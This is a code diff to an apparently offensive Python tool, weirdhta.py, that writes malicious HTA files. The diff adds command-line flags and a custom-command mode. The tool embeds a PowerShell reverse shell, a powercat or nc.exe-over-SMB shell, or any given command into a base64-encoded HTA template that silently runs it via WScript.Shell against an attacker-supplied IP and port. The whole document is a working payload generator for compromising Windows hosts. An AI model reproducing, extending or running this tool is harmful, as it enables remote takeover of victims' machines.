@@ -10,10 +10,12 @@ import sys
 
 def Main():
     parser = argparse.ArgumentParser()
-    parser.add_argument("ip", help="IP address", type=str)
-    parser.add_argument("port", help="PORT", type=str)
-    parser.add_argument("--smb", help="execute nc.exe via smb", action="store_true")
-    parser.add_argument("--powercat", help="use powercat.ps1 (if powershell don't work)", action="store_true")
+    parser.add_argument("-ip", "--ip", help="IP address", type=str)
+    parser.add_argument("-p", "--port", help="PORT", type=str)
+    parser.add_argument("-s","--smb", help="execute nc.exe via smb", action="store_true")
+    parser.add_argument("-n","--normal", help="normal powershell rev", action="store_true")
+    parser.add_argument("-c", "--command", help="Run your custom command")
+    parser.add_argument("-nc","--powercat", help="use powercat.ps1 (if powershell don't work)", action="store_true")
     args = parser.parse_args()
 
     def reverse_shell(ip, port):
@@ -57,6 +59,10 @@ def Main():
         print(rev)
         return rev
     
+    def custom_command(cmd):
+        rev = cmd.replace("\\" , "\\\\")
+        return rev
+    
     def hta(payload):
         hta_b64 = "PGh0bWw+CjxoZWFkPgoKPEhUQTpBUFBMSUNBVElPTiBpZD0id2VpcmRodGEiCmFwcGxpY2F0aW9uTmFtZT0id2VpcmRodGEiCmJvcmRlcj0idGhpbiIKYm9yZGVyU3R5bGU9Im5vcm1hbCIKY2FwdGlvbj0ieWVzIgppY29uPSJodHRwOi8vMTI3LjAuMC4xL2Zhdmljb24uaWNvIgptYXhpbWl6ZUJ1dHRvbj0ieWVzIgptaW5pbWl6ZUJ1dHRvbj0ieWVzIgpzaG93SW5UYXNrYmFyPSJubyIKd2luZG93U3RhdGU9Im5vcm1hbCIKaW5uZXJCb3JkZXI9InllcyIKbmF2aWdhYmxlPSJ5ZXMiCnNjcm9sbD0iYXV0byIKc2Nyb2xsRmxhdD0ieWVzIgpzaW5nbGVJbnN0YW5jZT0ieWVzIiAKc3lzTWVudT0ieWVzIgpjb250ZXh0TWVudT0ieWVzIgpzZWxlY3Rpb249InllcyIgCnZlcnNpb249IjEuMCIgLz4KCjxzY3JpcHQ+CmE9bmV3IEFjdGl2ZVhPYmplY3QoIldTY3JpcHQuU2hlbGwiKTsKYS5ydW4oInBvd2Vyc2hlbGwgLW5vcCAtdyAxIC1lbmMgQkFTRTY0IiwgMCk7d2luZG93LmNsb3NlKCk7Cjwvc2NyaXB0Pgo8dGl0bGU+V2VpcmQgVGl0bGU8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5Pgo8aDE+V0VJUkQgSFRBPC9oMT4KPGhyPgo8L2JvZHk+CjwvaHRtbD4KCg=="
         hta_plain = base64.b64decode(hta_b64).decode()
@@ -74,6 +80,15 @@ def Main():
             f.write(hta)
             f.close()
         print(f"[*] Written {fname}")
+
+    def custom_hta(payload):
+        hta_b64 = "PGh0bWw+CjxoZWFkPgoKPEhUQTpBUFBMSUNBVElPTiBpZD0id2VpcmRodGEiCmFwcGxpY2F0aW9uTmFtZT0id2VpcmRodGEiCmJvcmRlcj0idGhpbiIKYm9yZGVyU3R5bGU9Im5vcm1hbCIKY2FwdGlvbj0ieWVzIgppY29uPSJodHRwOi8vMTI3LjAuMC4xL2Zhdmljb24uaWNvIgptYXhpbWl6ZUJ1dHRvbj0ieWVzIgptaW5pbWl6ZUJ1dHRvbj0ieWVzIgpzaG93SW5UYXNrYmFyPSJubyIKd2luZG93U3RhdGU9Im5vcm1hbCIKaW5uZXJCb3JkZXI9InllcyIKbmF2aWdhYmxlPSJ5ZXMiCnNjcm9sbD0iYXV0byIKc2Nyb2xsRmxhdD0ieWVzIgpzaW5nbGVJbnN0YW5jZT0ieWVzIiAKc3lzTWVudT0ieWVzIgpjb250ZXh0TWVudT0ieWVzIgpzZWxlY3Rpb249InllcyIgCnZlcnNpb249IjEuMCIgLz4KCjxzY3JpcHQ+CmE9bmV3IEFjdGl2ZVhPYmplY3QoIldTY3JpcHQuU2hlbGwiKTsKYS5ydW4oIkNNREhFUkUiLCAwKTt3aW5kb3cuY2xvc2UoKTsKPC9zY3JpcHQ+Cjx0aXRsZT5XZWlyZCBUaXRsZTwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CjxoMT5XRUlSRCBIVEE8L2gxPgo8aHI+CjwvYm9keT4KPC9odG1sPgoK"
+        hta_plain = base64.b64decode(hta_b64).decode()
+        hta = hta_plain.replace("CMDHERE", payload)
+        with open("fela.hta", 'w', encoding = 'utf-8') as f:
+            f.write(hta)
+            f.close()
+        print(f"[*] Written fela.hta")
         
     if args.powercat:
         payload = nc_shell(args.ip, args.port)
@@ -90,9 +105,16 @@ def Main():
         print("[*] Please install impacket")
         print(f"[*] python smbserver.py {share} . -smb2support")
 
-    else:
+    elif args.normal:
         payload = reverse_shell(args.ip, args.port)
         hta(payload)
+
+    elif args.command:
+        payload = custom_command(args.command)
+        print(payload)
+        custom_hta(payload)
+    else:
+        sys.exit("[*] python3 weirdhta.py -h")
 
 if __name__ == "__main__":
     Main()
